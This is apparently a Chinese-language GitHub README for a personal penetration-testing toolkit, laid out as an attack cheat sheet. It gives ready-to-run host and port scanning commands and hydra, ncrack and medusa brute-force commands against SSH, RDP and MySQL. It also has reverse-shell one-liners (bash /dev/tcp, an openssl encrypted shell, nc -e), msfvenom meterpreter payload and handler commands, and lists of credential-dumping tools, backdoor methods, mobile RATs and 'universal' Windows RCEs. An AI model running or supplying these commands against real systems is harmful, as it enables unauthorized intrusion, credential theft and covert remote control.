## 安全测试工具集


### 简介


在学习和渗透测试过程中自己写的一些小脚本、小工具和一些常用字典、木马。

## ++++++++++分割线+++++++++++



## 其他工具渗透测试速查清单

### 站点信息收集
```
Google
Fofa
Shodan
Zoomeye
Goby
whatweb
Github
robtex
```

### 快速探测存活主机

nmap

```
nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt
nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oX result.xml
nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt
```

格式化输出存活ip，做后续详细扫描使用  
https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py

```
-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；
-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；
-n： 禁止DNS反向解析；
–open： 只输出检测状态为open的端口，即开放的端口；
–min-hostgroup 4：调整并行扫描组的大小；
–min-parallelism 1024：调整探测报文的并行度；
–host-timeout 30：检测超时的跳过
-T4：总共有T0-T5，貌似T4比较折中
-v：打印详细扫描过程
-oG：输出为比较人性化的格式，一条记录一行，后期好处理
-iL：载入ip段文件，批量扫，不用一条条执行了。
```

ipscan

### 快速探测端口

masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。  
https://www.freebuf.com/sectool/112583.html
```
masscan 172.18.2.1 -p1-65535 --rate=10000
masscan -p80,8080-8100 10.0.0.0/8 -oL result_mas.txt --rate=10000
masscan -p80,8080-8100 10.0.0.0/8 -oX result_mas.txt --rate=10000
```

### 邮箱搜集工具

EmailSniper


### 子域名收集

SubDominscanner

### 指纹收集

whatweb -v http://baidu.com

### web目录扫描

御剑

Dirbuster

https://www.jianshu.com/p/79c7b1eda56e

webpathbrute

### 漏洞扫描 

wvs

burpsuite

nessus
 

### 爆破

hydra
```
hydra -V -l fakeroot -P top100.txt 172.18.2.177 ssh
hydra -V -l admin -P top100.txt 172.18.2.177 rdp
hydra -V -l root -P top100.txt 172.18.2.177 mysql
```

ncrack
```
ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p ssh -g CL=10,at=3
ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p mysql -g CL=10,at=3
```
medusa
```
medusa -v 6 -h 172.18.2.177 -u fakeroot -P top100.txt -M ssh -t 10 -O out.txt
medusa -v 6 -h 172.18.2.177 -u root -P top100.txt -M mysql -t 10 -O out.txt
```

### 漏洞利用

metasploit

burpsuite

sqlmap


### webshell

菜刀

蚁剑

冰蝎

cobalt strike

反弹shell

普通shell
```
bash -i >& /dev/tcp/HOST/PORT 0>&1
```

加密shell
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.xx.xx:4444 > /tmp/s; rm /tmp/s
```

nc
```
攻击机 nc -lvp 4444
靶机 nc -e /bin/bash xx.xx.xx.xx 4444
```

### 提权

sudo提权  
http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/

各类exp  
典型通杀:脏牛CVE-2016-5195

metasploit

本地漏洞扫描工具

windows/linux exploit suggester


### 本地口令获取和破解

mimikatz

Mimipenguin

LaZagne  
http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/

hashcat+口令字典  
http://next.uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/

```
--hash-type 0 --attack-mode 0
-m选择哈希类型
1000为windows nt hash
-a选择模式
0 Straight（字典破解）
1 Combination（组合破解）
3 Brute-force（掩码暴力破解）
6 Hybrid dict + mask（混合字典+掩码）
7 Hybrid mask + dict（混合掩码+字典）
```

### 本地信息收集

linuxprivchecker

LinEnum

### 后门

常见后门手法

metasploit
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=170.170.64.17 LPORT=4444 -f elf -o reverse_tcp_linux64
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -o reverse_tcp.exe
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST xxx.xxx.xxx.xxx
set LPORT 4444
run

常用后续命令
https://www.cnblogs.com/backlion/p/9484949.html
```

python直连反弹shell  
http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/
其他语言直连反弹shell  


windows常见奇淫技巧后门手法  
http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/

### 内网横向渗透

Hydra

nessus

metasploit

nmap

powersploit

Empire

Psnmap

lcx

ew

tunna

proxychains

FRP

N2N

### arp欺骗

Cain

Arpspoof

### 远控

pupy类远控

teamview

pcanywhere

radmin

手机端

DroidJack

Dendroid

### 典型windows-rce

ms17-010 基本通杀

cve-2019-0708 开放3389情况 windows7及之前通杀
